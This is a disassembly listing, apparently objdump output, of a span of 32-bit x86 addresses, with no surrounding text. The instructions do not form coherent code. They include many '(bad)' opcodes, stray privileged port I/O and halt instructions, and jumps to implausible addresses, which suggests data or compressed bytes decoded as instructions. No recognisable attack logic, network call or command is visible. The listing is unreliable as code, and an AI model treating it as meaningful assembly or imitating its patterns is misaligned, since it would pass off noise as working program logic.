  427d9f:	outs   dx,BYTE PTR ds:[esi]
  427da0:	add    esi,esp
  427da2:	and    BYTE PTR [esi-0x19b3880c],0x3
  427da9:	hlt    
  427daa:	mov    DWORD PTR [edx],ebp
  427dac:	loopne 0x427d69
  427dae:	mov    ah,0x71
  427db0:	cmp    al,0xc3
  427db2:	pop    ss
  427db3:	mov    ecx,0xc82d0124
  427db8:	mov    ecx,0xed651840
  427dbd:	ins    BYTE PTR es:[edi],dx
  427dbe:	dec    esp
  427dbf:	outs   dx,DWORD PTR ds:[esi]
  427dc0:	add    BYTE PTR [edx+ebx*2],bl
  427dc3:	push   esp
  427dc4:	and    al,0x28
  427dc6:	sub    al,0xa1
  427dc8:	cdq    
  427dc9:	jmp    0x427d54
  427dcb:	ret    0xabdf
  427dce:	mov    esp,0x501054e
  427dd3:	out    0x76,eax
  427dd5:	mov    bh,0xe0
  427dd7:	(bad)  
  427dd8:	shr    DWORD PTR [esi-0x3f],cl
  427ddb:	retf   0xabe7
  427dde:	mov    esp,DWORD PTR ds:0xb5e95dd3
  427de4:	jbe    0x427d8d
  427de6:	loopne 0x427e4e
  427de8:	add    esi,esp
  427dea:	add    al,0xf
  427dec:	scas   eax,DWORD PTR es:[edi]
  427ded:	arpl   WORD PTR ds:0x8b780e7,ax
  427df3:	ins    BYTE PTR es:[edi],dx
  427df4:	inc    ebx
  427df5:	inc    edi
  427df6:	xchg   edi,eax
  427df7:	popa   
  427df8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427df9:	pop    ss
  427dfa:	cmc    
  427dfb:	jno    0x427e4f
	...
  427e15:	add    BYTE PTR [esp+edi*1+0x71],ch
  427e19:	enter  0xf0d7,0x37
  427e1d:	sub    al,0x10
  427e1f:	mov    fs,esi
  427e21:	add    esi,DWORD PTR [edi+0x44]
  427e24:	cmp    ch,BYTE PTR [esp+ebp*2+0x7cf80290]
  427e2b:	aaa    
  427e2c:	jmp    DWORD PTR [ecx-0xd]
  427e2f:	lea    edi,[ebx+0x5]
  427e32:	test   BYTE PTR [edx+0x2cf3e14b],cl
  427e38:	cmc    
  427e39:	data16 clc 
  427e3b:	add    al,0x84
  427e3d:	test   eax,0xea88c88c
  427e42:	cli    
  427e43:	(bad)  
  427e44:	imul   ebp,ebp,0x2976d78f
  427e4a:	clc    
  427e4b:	mov    ah,0xe7
  427e4d:	xchg   esi,eax
  427e4e:	js     0x427e67
  427e50:	cld    
  427e51:	(bad)  
  427e52:	out    0x85,al
  427e54:	add    ch,ch
  427e56:	repnz or eax,0xe38c5e55
  427e5c:	sub    edi,DWORD PTR [eax-0x1678b521]
  427e62:	not    DWORD PTR [edi]
  427e64:	cmp    DWORD PTR [edx+0x55],esi
  427e67:	(bad)  
  427e68:	cld    
  427e69:	mov    dh,0x1f
  427e6b:	pop    ds
  427e6c:	and    DWORD PTR [ecx-0x10],0x4
  427e70:	mov    edi,esp
  427e72:	(bad)  
  427e73:	xchg   ebx,eax
  427e74:	and    edx,ecx
  427e76:	push   0x7227c0
	...
  427e93:	sti    
  427e94:	jge    0x427eda
  427e96:	lds    ebx,FWORD PTR [edi]
  427e98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e99:	xchg   ecx,ebp
  427e9b:	imul   DWORD PTR [edx-0x47f060ed]
  427ea1:	xchg   cl,ch
  427ea3:	not    DWORD PTR [esi+edi*8+0x1]
  427ea7:	repnz sar BYTE PTR [edi-0x77424a72],cl
  427eae:	int3   
  427eaf:	mov    ah,0x44
  427eb1:	add    ebp,ecx
  427eb3:	ins    BYTE PTR es:[edi],dx
  427eb4:	(bad)  
  427eb5:	jmp    0x427f21
  427eb7:	(bad)  [ecx-0x6c8cc8b0]
  427ebd:	or     eax,DWORD PTR [eax]
  427ebf:	or     eax,0xea000864
  427ec4:	icebp  
  427ec5:	xor    bl,0x9d
  427ec8:	add    al,BYTE PTR [eax]
  427eca:	mov    ecx,ebx
  427ecc:	or     BYTE PTR [edi+0x65],bh
  427ecf:	push   ecx
  427ed0:	add    cl,BYTE PTR [ecx+0x66529145]
  427ed6:	push   ss
  427ed7:	sub    ebp,ecx
  427ed9:	sbb    bh,0x4d
  427edc:	add    al,BYTE PTR [edi-0xbbb1b28]
  427ee2:	test   DWORD PTR [esi-0x62cdfc83],edx
  427ee8:	jmp    0x28f807b
  427eed:	push   0x2a
  427eef:	shl    BYTE PTR [eax+edx*8+0x58],0xc5
  427ef4:	adc    ecx,DWORD PTR [edx]
	...
  427f0e:	add    BYTE PTR [eax],al
  427f10:	sbb    eax,0x308d2468
  427f15:	ret    0xe854
  427f18:	out    dx,al
  427f19:	repnz (bad) 
  427f1b:	jmp    DWORD PTR [eax-0x3daf2fb4]
  427f21:	jl     0x427f1b
  427f23:	push   ebx
  427f24:	mov    ch,0x61
  427f26:	inc    esp
  427f27:	call   edx
  427f29:	xchg   bl,cl
  427f2b:	push   ecx
  427f2c:	lods   eax,DWORD PTR ds:[esi]
  427f2d:	dec    esi
  427f2e:	in     al,0x56
  427f30:	xchg   ebp,eax
  427f31:	loop   0x427f2e
  427f33:	push   ebx
  427f34:	inc    eax
  427f35:	xor    eax,0xf58889f8
  427f3a:	in     al,0x91
  427f3c:	shl    bl,1
  427f3e:	sti    
  427f3f:	add    BYTE PTR [esi+0x5e087101],0xe9
  427f46:	fld    DWORD PTR [edi-0x4c18fe33]
  427f4c:	inc    edi
  427f4d:	cmp    DWORD PTR [ecx-0x44b80b83],ecx
  427f53:	out    0x8c,eax
  427f55:	cmp    BYTE PTR [eax],al
  427f57:	add    BYTE PTR [esi],cl
  427f59:	cmc    
  427f5a:	mov    WORD PTR [edx-0x7c],?
  427f5d:	jecxz  0x427f8a
  427f5f:	(bad)  
  427f61:	sub    eax,DWORD PTR [eax]
  427f63:	mov    DWORD PTR [ebx-0x4bbd7305],edi
  427f69:	fisttp DWORD PTR [edx+eax*2+0x20addb58]
  427f70:	retf   
  427f71:	mov    al,ds:0x9b94
	...
  427f8a:	add    BYTE PTR [eax],al
  427f8c:	add    BYTE PTR [esp+esi*1-0x69],cl
  427f90:	call   FWORD PTR [ebx-0x56]
  427f93:	inc    edi
  427f94:	or     edi,DWORD PTR [ecx+0x6b]
  427f97:	xchg   edi,eax
  427f98:	ret    0x5d7f
  427f9b:	mov    dl,bh
  427f9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427f9e:	mov    eax,0x6869fb9c
  427fa3:	sbb    bh,ah
  427fa5:	loop   0x427f3a
  427fa7:	add    eax,DWORD PTR [eax]
  427fa9:	jno    0x427f96
  427fab:	xchg   edi,eax
  427fac:	cmp    BYTE PTR [ebx+ebp*2+0x31f43f99],cl
  427fb3:	add    al,0x59
  427fb5:	and    DWORD PTR [eax+0x18],0x3a3eee7
  427fbc:	add    BYTE PTR [ecx-0x15],bh
  427fbf:	xchg   edi,eax
  427fc0:	and    al,0x6f
  427fc2:	push   0xe6418908
  427fc7:	mov    dl,BYTE PTR [edx-0x18]
  427fca:	das    
  427fcb:	cmp    eax,DWORD PTR [edi+0x47890d00]
  427fd1:	fs xchg ebp,eax
  427fd3:	mov    bl,0x73
  427fd5:	jge    0x42803d
  427fd7:	cwde   
  427fd8:	gs jge 0x428051
  427fdb:	pushf  
  427fdc:	mov    BYTE PTR [ecx],bh
  427fde:	xor    al,BYTE PTR [esi+0x3f]
  427fe1:	call   0xbb6d67ea
  427fe6:	add    eax,0xb27d03e7
  427feb:	into   
  427fec:	sub    dl,BYTE PTR [ecx]
  427fee:	adc    al,0xcd
  427ff0:	and    BYTE PTR [eax],al
	...
  42800a:	adc    edi,ebp
  42800c:	(bad)  
  42800d:	add    esi,esp
  42800f:	sbb    al,0x5
  428011:	mov    DWORD PTR [ebx+0x763b6114],ecx
  428017:	xor    ch,bl
  428019:	xchg   esi,esp
  42801b:	adc    esp,DWORD PTR [ebp-0x153d81e0]
  428021:	mov    dl,0xd3
  428023:	add    al,0xf7
  428025:	add    esi,esp
  428027:	sub    DWORD PTR [ecx],0xfc13c40a
  42802d:	or     edx,DWORD PTR [ecx-0x6]
  428030:	push   esi
  428031:	test   BYTE PTR [ebx],0x5
  428034:	push   0x1b
  428036:	inc    edx
  428037:	add    esp,DWORD PTR [esp+ebx*8+0x38]
  42803b:	adc    al,0x65
  42803d:	test   BYTE PTR [esi+0x896e700],ch
  428043:	lahf   
  428044:	jmp    0x428001
  428046:	mov    bl,0x9c
  428048:	sahf   
  428049:	call   0x8bb6:0x2b9a04db
  428050:	out    0x3,al
  428052:	jae    0x42801e
  428054:	loop   0x428081
  428056:	mov    dl,0x16
  428058:	sub    eax,0xeeca6c20
  42805d:	and    BYTE PTR [ebx],dh
  42805f:	or     DWORD PTR [edx],edx
  428061:	mov    dh,0xe8
  428063:	cdq    
  428064:	loop   0x427ff2
  428066:	in     al,0x9c
  428068:	mov    dh,0x9a
  42806a:	sbb    eax,DWORD PTR ds:0x691
	...
  428084:	add    BYTE PTR [eax],al
  428086:	add    BYTE PTR [ecx],dh
  428088:	sbb    eax,0x13cb9977
  42808d:	dec    DWORD PTR [edi-0x11087b82]
  428093:	jmp    0x42801d
  428095:	mul    bh
  428097:	adc    edx,DWORD PTR [ecx]
  428099:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  42809b:	cld    
  42809c:	in     al,dx
  42809d:	or     ah,bl
  42809f:	jbe    0x4280f4
  4280a1:	add    DWORD PTR [edx-0x8],ebp
  4280a4:	or     DWORD PTR [ecx+ebx*8-0xe],esi
  4280a8:	xchg   esi,eax
  4280a9:	or     ebp,DWORD PTR [edi+edi*4+0x9]
  4280ad:	dec    edi
  4280ae:	fs in  al,0xec
  4280b1:	dec    esi
  4280b2:	rcr    esi,0x89
  4280b5:	(bad)  
  4280b6:	call   0x724e48b3
  4280bb:	cmp    eax,0x5fedc5ff
  4280c0:	(bad)  
  4280c1:	cld    
  4280c2:	and    al,0x4
  4280c4:	jle    0x428108
  4280c6:	cmc    
  4280c7:	mov    ecx,0xeaf31807
  4280cc:	(bad)  
  4280cd:	or     esp,DWORD PTR [edx+0x2d]
  4280d0:	or     ecx,DWORD PTR [ecx+0x5f85e41c]
  4280d6:	loope  0x4280cf
  4280d8:	mov    edx,DWORD PTR [edi-0x27]
  4280db:	js     0x4280a8
  4280dd:	jae    0x4280ae
  4280df:	mov    edx,0xf7e97bd3
  4280e4:	push   esp
  4280e5:	(bad)  
  4280e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280e7:	push   ecx
  4280e8:	lods   al,BYTE PTR ds:[esi]
  4280e9:	(bad)  
  4280ea:	sub    eax,DWORD PTR [eax]
	...
  428104:	clc    
  428105:	add    al,0x89
  428107:	test   eax,0xb5fcb9fb
  42810c:	adc    ecx,DWORD PTR [ebx]
  42810e:	mov    esp,DWORD PTR [ecx-0xa407a11]
  428114:	pop    ds
  428115:	std    
  428116:	test   cl,ch
  428118:	not    DWORD PTR [edi]
  42811a:	xlat   BYTE PTR ds:[ebx]
  42811b:	repnz aaa 
  42811d:	sbb    edi,edx
  42811f:	add    BYTE PTR [edx+0x600000c4],bl
  428125:	jg     0x42810f
  428127:	cmp    ecx,0x2c
  42812a:	dec    edi
  42812b:	push   esi
  42812c:	push   esi
  42812d:	clc    
  42812e:	xchg   DWORD PTR [esi-0xb],eax
  428131:	jge    0x428177
  428133:	add    al,0xe2
  428135:	jg     0x428188
  428137:	clc    
  428138:	adc    al,0x3d
  42813a:	clc    
  42813b:	test   DWORD PTR [ebx+eax*1-0x7c],edx
  42813f:	sbb    BYTE PTR [ebp+0x34830006],0xd
  428146:	cld    
  428147:	je     0x428116
  428149:	pop    esi
  42814a:	xor    ecx,DWORD PTR [ebp-0x17ab2338]
  428150:	cs cmc 
  428152:	(bad)  
  428153:	call   FWORD PTR [edx-0x45]
  428156:	inc    edx
  428157:	adc    bl,BYTE PTR ds:0x5d46b302
  42815d:	push   esi
  42815e:	xchg   edi,eax
  428160:	in     eax,dx
  428161:	pop    esi
  428162:	adc    al,0x5f
  428164:	fsubr  DWORD PTR [eax+ecx*8-0x18]
	...
  428180:	add    BYTE PTR [eax-0x31000394],bh
  428186:	leave  
  428187:	or     BYTE PTR [ebp-0x74f28623],al
  42818d:	fstp   TBYTE PTR [esi-0x2c]
  428190:	mov    edx,DWORD PTR [eax-0xe]
  428193:	dec    ebp
  428194:	call   0x3e742b
  428199:	mov    eax,ds:0x9e2371c5
  42819e:	mov    ebp,0x5c09ebfb
  4281a3:	(bad)  
  4281a4:	pop    edx
  4281a5:	add    eax,0xf4751851
  4281aa:	jge    0x428169
  4281ac:	lea    edx,[ebp-0xbab9bf3]
  4281b2:	je     0x428174
  4281b4:	push   DWORD PTR [esi-0x25]
  4281b7:	hlt    
  4281b8:	out    0x76,eax
  4281ba:	mov    eax,ds:0xdb710000
  4281bf:	sub    eax,ebx
  4281c1:	outs   dx,DWORD PTR ds:[esi]
  4281c2:	pusha  
  4281c3:	sbb    al,0x88
  4281c5:	xor    al,0x28
  4281c7:	sbb    eax,0xbc96ac72
  4281cc:	pop    es
  4281cd:	mov    dl,0xdb
  4281cf:	(bad)  
  4281d0:	(bad)  
  4281d1:	outs   dx,BYTE PTR ds:[esi]
  4281d2:	loopne 0x4281f3
  4281d4:	out    0x2c,eax
  4281d6:	inc    ebx
  4281d7:	sbb    bh,ah
  4281d9:	js     0x428236
  4281db:	xchg   edi,eax
  4281dc:	mov    esi,0x5dba5bc7
  4281e1:	pop    ds
  4281e2:	gs inc ecx
  4281e4:	add    eax,DWORD PTR [eax]
	...
  4281fe:	hlt    
  4281ff:	out    dx,al
  428200:	mov    ah,0x55
  428202:	jg     0x4281f0
  428204:	sti    
  428205:	mov    BYTE PTR [edx+0x79e98727],dh
  42820b:	pop    ebx
  42820c:	xchg   edi,eax
  42820d:	cmp    DWORD PTR [ebx+esi*8-0x1],esi
  428211:	(bad)  
  428212:	fstp   QWORD PTR ds:0xfaef72b7
  428218:	mov    WORD PTR [edi-0x24],?
  42821b:	add    edi,DWORD PTR [esi+esi*2-0x4080e44c]
  428222:	or     BYTE PTR [ebx+edx*8-0x44e40b7b],dh
  428229:	xor    BYTE PTR [eax+esi*1],0x5
  42822d:	sub    DWORD PTR [edx+eax*8],0x617f1726
  428234:	add    al,0x88
  428236:	lods   al,BYTE PTR ds:[esi]
  428237:	das    
  428238:	xchg   DWORD PTR [ebx-0x28],ebx
  42823b:	sub    esi,DWORD PTR [ebp+0x15c33288]
  428241:	std    
  428242:	repz add eax,0x99ab8826
  428248:	add    edx,ecx
  42824a:	mov    ds:0xb5b8b3af,eax
  42824f:	or     edi,esp
  428251:	mov    BYTE PTR [edx],dl
  428253:	in     eax,dx
  428254:	imul   ebx,DWORD PTR [edi+esi*8+0x6ce37304],0x6cb0eac5
  42825f:	mov    cl,0xc2
  428261:	or     eax,DWORD PTR [eax]
	...
  42827b:	dec    ecx
  42827c:	sbb    BYTE PTR [esi-0x18],0x45
  428280:	test   BYTE PTR [esi+0x6b1b9be3],ah
  428286:	add    esi,esp
  428288:	scas   eax,DWORD PTR es:[edi]
  428289:	xor    DWORD PTR [edi-0x7f1465ad],eax
  42828f:	mov    bl,0x10
  428291:	rol    DWORD PTR [ecx],1
  428293:	lds    eax,FWORD PTR [eax+ebp*4+0x7]
  428297:	hlt    
  428298:	push   DWORD PTR [ebp-0x4e]
  42829b:	pop    es
  42829c:	jl     0x4282c5
  42829e:	cld    
  42829f:	ror    DWORD PTR [esi-0x52],0x3
  4282a3:	hlt    
  4282a4:	add    al,0xd
  4282a6:	fld    DWORD PTR [ecx-0x51]
  4282a9:	sbb    DWORD PTR [edi],eax
  4282ab:	jne    0x4282b8
  4282ad:	or     dl,BYTE PTR [ecx+0x1cd67bf6]
  4282b3:	mov    ch,0x8
  4282b5:	or     eax,0xf8aa89
  4282ba:	add    ebx,DWORD PTR [edx+0x1c0bb67d]
  4282c0:	ror    DWORD PTR [edx+0x26d4201c],0x40
  4282c7:	(bad)  
  4282c8:	jnp    0x428304
  4282ca:	sbb    BYTE PTR [edi],0xf9
  4282cd:	data16 fidivr WORD PTR ds:0xf403a93c
  4282d4:	mov    bl,0xff
  4282d6:	sahf   
  4282d7:	inc    eax
  4282d8:	add    DWORD PTR [edx+ebp*2+0x110004f4],eax
	...
  4282f7:	add    ch,bl
  4282f9:	and    bh,bh
  4282fb:	call   0x6d4ed27b
  428300:	add    DWORD PTR [eax+eax*1],0xb8a74e9
  428307:	jmp    0xeaae0c04
  42830c:	test   DWORD PTR [ecx+eax*4],0xd0fc774
  428313:	pop    edi
  428314:	push   ebp
  428315:	add    al,0x0
  428317:	jmp    0x374a1596
  42831c:	ror    dh,1
  42831e:	not    dh
  428320:	inc    DWORD PTR [ebx-0x40ec2141]
  428326:	add    cl,ch
  428328:	idiv   DWORD PTR [ebp+0x3a]
  42832b:	loope  0x4282b6
  42832d:	iret   
  42832e:	push   DWORD PTR [ecx+0x68]
  428331:	cmp    eax,DWORD PTR [eax-0x17]
  428334:	stos   BYTE PTR es:[edi],al
  428335:	adc    ah,dl
  428337:	xchg   ecx,eax
  428338:	retf   0xfc21
  42833b:	sahf   
  42833c:	jno    0x428300
  42833e:	sti    
  42833f:	push   0xfffffff8
  428341:	adc    BYTE PTR [eiz*2-0x16fffb9d],cl
  428348:	cwde   
  428349:	dec    edi
  42834a:	xchg   ecx,ebp
  42834c:	test   DWORD PTR [ecx+eax*1],0x403b9bec
  428353:	jmp    0xe9b61ad2
  428358:	test   BYTE PTR [ecx],cl
  42835a:	and    cl,0x0
	...
  428375:	jl     0x428386
  428377:	jo     0x428372
  428379:	(bad)  
  42837a:	xchg   edx,eax
  42837b:	cmovle esp,DWORD PTR [ebp-0x5]
  42837f:	out    0x0,eax
  428381:	mov    cl,dh
  428383:	sti    
  428384:	jmp    DWORD PTR [esp+ecx*1+0x7e0dffff]
  42838b:	aam    0x8b
  42838d:	push   ss
  42838e:	sbb    BYTE PTR [ecx-0x14],0x5
  428392:	nop
  428393:	jmp    0x428394
  428395:	add    al,BYTE PTR [eax-0x3d410fbf]
  42839b:	bound  ecx,QWORD PTR [ecx+0x4589fe98]
  4283a1:	loope  0x428422
  4283a3:	aas    
  4283a4:	push   eax
  4283a5:	inc    esi
  4283a6:	inc    esp
  4283a7:	in     al,dx
  4283a8:	xor    edi,DWORD PTR [ebx-0x398b3dd1]
  4283ae:	hlt    
  4283af:	cld    
  4283b0:	add    BYTE PTR [ecx+0x13],cl
  4283b3:	dec    esp
  4283b4:	dec    DWORD PTR [eax-0x23]
  4283b7:	in     al,0xfa
  4283b9:	(bad)  
  4283ba:	jmp    0x4283b7
  4283bc:	test   BYTE PTR [ebp-0x5],bl
  4283bf:	sub    DWORD PTR [edx-0x74fffd61],0xffffffd8
  4283c6:	fsubr  st(7),st
  4283c8:	mov    cl,0x16
  4283ca:	inc    ebp
  4283cb:	call   0xfcd0495b
  4283d0:	call   FWORD PTR [ebp+0x2f]
  4283d3:	fidiv  DWORD PTR [esi-0x4b]
  4283d6:	das    
  4283d7:	pop    ecx
  4283d8:	adc    BYTE PTR [eax],al
	...
  4283f2:	push   edx
  4283f3:	dec    eax
  4283f4:	pop    ecx
  4283f5:	adc    BYTE PTR [esi],cl
  4283f7:	jmp    0xff00:0x25d80ac
  4283fe:	dec    eax
  4283ff:	push   es
  428400:	call   0x444d65
  428405:	mov    ebx,eax
  428407:	fsub   QWORD PTR ds:0x19998
  42840d:	add    BYTE PTR [esi-0xb7417bc],ah
  428413:	mov    ds:0x1c13ff7c,eax
  428418:	(bad)  
  42841a:	sub    DWORD PTR ds:0x1c74af19,0x1b0c0000
  428424:	jl     0x428425
  428426:	repz mov ds:0xab7debbf,al
  42842c:	cmp    bh,0xe3
  42842f:	sbb    ebp,DWORD PTR ds:0x809b6f0e
  428435:	call   ebx
  428437:	sbb    esi,DWORD PTR [ebx-0x4cdc0776]
  42843d:	dec    edi
  42843e:	int3   
  42843f:	cmp    bh,BYTE PTR [edi+edi*8-0x45]
  428443:	mov    ds:0x959febbf,al
  428448:	push   esi
  428449:	xchg   DWORD PTR [eax-0x5ca9fc26],edi
  42844f:	sbb    ah,dh
  428451:	adc    DWORD PTR [esp+ebx*1],esi
  428454:	pop    ss
  428455:	jb     0x428457
	...
  42846f:	in     al,0x3e
  428471:	mov    WORD PTR [ebx],cs
  428473:	mov    edx,eax
  428475:	or     edi,ebp
  428477:	jmp    0xf482cc07
  42847c:	mov    ds:0x2f38803b,al
  428481:	jge    0x42845b
  428483:	sti    
  428484:	xchg   ebx,eax
  428485:	mov    bl,0x1
  428487:	hlt    
  428488:	sbb    ebp,DWORD PTR [esi-0x735dbc04]
  42848e:	pop    es
  42848f:	pop    esp
  428490:	into   
  428491:	and    al,0xfc
  428493:	dec    ebx
  428494:	xchg   edx,eax
  428495:	sbb    eax,DWORD PTR [esi-0x37d703f]
  42849b:	cmp    esp,DWORD PTR [esi]
  42849d:	jl     0x42849b
  42849f:	cmc    
  4284a0:	sbb    eax,DWORD PTR [eax]
  4284a2:	sub    DWORD PTR [ecx+0x6d045704],0xb44882d7
  4284ac:	add    al,0xdb
  4284ae:	std    
  4284af:	jl     0x4284ee
  4284b1:	mov    edi,0xe704734a
  4284b6:	add    esi,ebp
  4284b8:	ds dec esi
  4284ba:	pop    edi
  4284bb:	or     DWORD PTR ds:0x15368b35,ecx
  4284c1:	arpl   WORD PTR [eax+edi*8-0x80],ax
  4284c5:	aas    
  4284c6:	add    esi,esp
  4284c8:	add    al,0x72
  4284ca:	inc    ecx
  4284cb:	push   edx
  4284cc:	inc    ebp
  4284cd:	pop    esi
  4284ce:	add    al,0xf4
  4284d0:	add    al,0xea
  4284d2:	inc    ecx
	...
  4284eb:	add    BYTE PTR [edx-0x3e],dh
  4284ee:	adc    dl,ch
  4284f0:	leave  
  4284f1:	mov    eax,0x87ef8efd
  4284f6:	fcomp  QWORD PTR es:[ebx]
  4284f9:	jno    0x428498
  4284fb:	ret    
  4284fc:	stos   DWORD PTR es:[edi],eax
  4284fd:	and    al,0xcc
  4284ff:	jno    0x4284a1
  428501:	or     al,0x71
  428503:	sbb    esi,DWORD PTR [edx-0x76]
  428506:	into   
  428507:	mov    eax,ds:0x91d291ca
  42850c:	sbb    DWORD PTR [eax-0x77d6d7cd],eax
  428512:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428513:	fist   DWORD PTR [ebx+0x7018808d]
  428519:	loopne 0x4284a8
  42851b:	(bad)  
  42851c:	iret   
  42851d:	jg     0x42854a
  42851f:	sub    BYTE PTR [ebp+edi*2+0x62],ch
  428523:	add    esi,esp
  428525:	add    al,0xea
  428527:	dec    esp
  428528:	jle    0x42857f
  42852a:	add    si,sp
  42852d:	add    al,0x8f
  42852f:	stos   DWORD PTR es:[edi],eax
  428530:	jne    0x428537
  428532:	out    0x7f,eax
  428534:	jnp    0x428532
  428536:	jmp    FWORD PTR [edi+esi*2+0xb]
  42853a:	cld    
  42853b:	jmp    0x732e4cb8
  428540:	outs   dx,DWORD PTR ds:[esi]
  428541:	mov    bh,bh
  428543:	call   0xde090d3f
  428548:	and    edi,DWORD PTR [ebp+0x7f]
  42854b:	imul   esi,edi,0x740004
	...
  428569:	adc    esi,esp
  42856b:	push   ecx
  42856c:	jb     0x428535
  42856e:	and    edx,DWORD PTR [edx+ebp*2-0x9]
  428572:	add    al,0x89
  428574:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428575:	adc    edi,DWORD PTR [ebp+0x4a]
  428578:	cmc    
  428579:	test   al,0x4
  42857b:	int    0xb8
  42857d:	cld    
  42857e:	pop    ebx
  42857f:	jg     0x42856a
  428581:	test   DWORD PTR [eax+ebp*8],0xfc0b70c2
  428588:	jb     0x42850c
  42858a:	pop    ds
  42858b:	(bad)  
  42858c:	pusha  
  42858d:	cmp    ecx,DWORD PTR [esp+edi*8]
  428590:	jmp    0xeca975d
  428595:	js     0x42855d
  428597:	out    dx,eax
  428598:	and    ah,dl
  42859a:	xchg   edi,eax
  42859b:	and    DWORD PTR [edx],esp
  42859d:	loop   0x428528
  42859f:	sbb    eax,0x8aff65d6
  4285a4:	push   ecx
  4285a5:	pushf  
  4285a6:	test   BYTE PTR [edi-0x7f572fef],bh
  4285ac:	jmp    0xe7020da8
  4285b1:	repz call 0x7e3a6eb5
  4285b7:	inc    edx
  4285b8:	cdq    
  4285b9:	outs   dx,DWORD PTR ds:[esi]
  4285ba:	mov    ?,edi
  4285bc:	fucompp 
  4285be:	mov    eax,ds:0xf8e41c36
  4285c3:	test   DWORD PTR [ecx-0x10],esp
  4285c6:	add    al,0x0
  4285c8:	add    BYTE PTR [esi],dh
  4285ca:	leave  
  4285cb:	or     eax,DWORD PTR [eax+eax*1+0x0]
	...
  4285e6:	int    0x0
  4285e8:	add    BYTE PTR [eax],al
  4285ea:	in     al,0xb8
  4285ec:	cld    
  4285ed:	call   FWORD PTR ds:0xc14d3569
  4285f3:	jne    0x4285fa
  4285f5:	push   eax
  4285f6:	lds    esp,FWORD PTR [edi-0xc]
  4285f9:	jmp    FWORD PTR [edx-0x690fbe81]
  4285ff:	inc    eax
  428600:	and    al,0x8b
  428602:	dec    eax
  428603:	jecxz  0x42858a
  428605:	inc    ecx
  428606:	cmp    eax,0x56f0417e
  42860b:	inc    ecx
  42860c:	sub    BYTE PTR [ebx+0x4185e288],cl
  428612:	cmp    DWORD PTR [edi+0x41],0x747164ec
  428619:	mov    esp,DWORD PTR [eax+0x7940c2e2]
  42861f:	push   es
  428620:	xchg   DWORD PTR [ebp-0x17],ecx
  428623:	sub    eax,0xc1210fda
  428628:	test   BYTE PTR [ecx+0x28],al
  42862b:	jg     0x42866e
  42862d:	lock adc al,0x71
  428630:	and    al,0x8b
  428632:	shl    ah,1
  428634:	jg     0x4285f6
  428636:	sbb    DWORD PTR [eax+0x7f],ebp
  428639:	clc    
  42863a:	add    al,BYTE PTR ds:[ebx+0x69d8a]
  428641:	mov    edx,eax
  428643:	lock sti 
  428645:	jo     0x428634
  428647:	fadd   DWORD PTR [ecx-0x7e]
	...
  428662:	add    BYTE PTR [ebp+0x6],bl
  428665:	xchg   DWORD PTR [ebp-0x53],eax
  428668:	rep ins BYTE PTR es:[edi],dx
  42866a:	adc    al,0x85
  42866c:	sub    al,0x7e
  42866e:	add    BYTE PTR [ebp+0x7f],cl
  428671:	inc    ecx
  428672:	lock hlt 
  428674:	add    eax,0x103480f0
  428679:	mov    al,0xe7
  42867b:	adc    eax,0x4d00009f
  428680:	addr16 pop ss
  428682:	cld    
  428683:	xor    esp,DWORD PTR [edi-0x22dd1439]
  428689:	les    edi,FWORD PTR [edi-0x57]
  42868c:	add    bl,cl
  42868e:	clc    
  42868f:	mov    eax,ds:0x88c5d906
  428694:	cmp    cl,bl
  428696:	fisttp QWORD PTR [edx+0x6667aa3c]
  42869c:	mov    ah,0x15
  42869e:	cld    
  42869f:	sti    
  4286a0:	xor    BYTE PTR [ebx+ecx*8+0x37],bh
  4286a4:	sbb    al,0xbb
  4286a6:	push   esi
  4286a7:	ja     0x42868f
  4286a9:	adc    eax,0x3a2732e8
  4286ae:	jae    0x4286e6
  4286b0:	and    eax,0x314a2b90
  4286b5:	mov    DWORD PTR [edi],edi
  4286b7:	sbb    al,0xa5
  4286b9:	ret    
  4286ba:	outs   dx,DWORD PTR ds:[esi]
  4286bb:	outs   dx,DWORD PTR ds:[esi]
  4286bc:	pop    eax
  4286bd:	adc    BYTE PTR [eax+0x4a893834],cl
  4286c3:	mov    al,ds:0x73c3a4
	...
  4286e0:	jg     0x428742
  4286e2:	and    al,0x86
  4286e4:	and    al,0xa4
  4286e6:	xchg   BYTE PTR [edx-0x78],al
  4286e9:	popa   
  4286ea:	ret    
  4286eb:	jnp    0x4286e2
  4286ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4286ee:	(bad)  
  4286ef:	jmp    0x4286c0
  4286f1:	pop    ecx
  4286f2:	add    dl,BYTE PTR [esp+esi*4+0x6f7ac093]
  4286f9:	loopne 0x42870e
  4286fb:	xchg   ah,ah
  4286fd:	add    eax,DWORD PTR [edi+0x5436472]
  428703:	jmp    0x428768
  428705:	add    al,0xa6
  428707:	sub    ecx,esi
  428709:	pop    es
  42870a:	popf   
  42870b:	adc    eax,0x2c92bf7c
  428710:	mov    edx,0xdb158d17
  428715:	jl     0x4286c9
  428717:	sar    DWORD PTR [ebx],0xa
  42871a:	shl    edi,cl
  42871c:	add    eax,0x3488e6c5
  428721:	sbb    eax,0x387babae
  428726:	test   eax,0xfaef1903
  42872b:	icebp  
  42872c:	rol    DWORD PTR [ecx+eax*8],cl
  42872f:	or     ebx,DWORD PTR [esp+esi*2+0x900153e]
  428736:	fstp   TBYTE PTR [edi+0x2f]
  428739:	(bad)
  42873c:	dec    edx
  42873d:	test   BYTE PTR [esi],bl
  42873f:	adc    eax,0x1499eedc
	...
  42875c:	add    BYTE PTR [esi],al
  42875e:	jmp    0x81e4b5b
  428763:	xchg   ebx,eax
  428764:	repz rcl BYTE PTR [edx-0x2b9eb1e],1
  42876b:	or     eax,0xa93993ef
  428770:	add    esi,DWORD PTR [ebp+0x41]
  428773:	jmp    0x7c41:0x1fac51b4
  42877a:	mov    ebp,0xaf46b086
  42877f:	jno    0x428714
  428781:	inc    ebx
  428782:	mov    al,0x71
  428784:	fwait
  428785:	das    
  428786:	dec    edx
  428787:	pop    esi
  428788:	inc    edi
  428789:	xor    al,0x5
  42878b:	xor    al,0x1
  42878d:	xchg   ebx,eax
  42878e:	fdivr  QWORD PTR [edi-0x271719ec]
  428794:	ret    
  428795:	jae    0x428746
  428797:	call   FWORD PTR [esi]
  428799:	jge    0x42872f
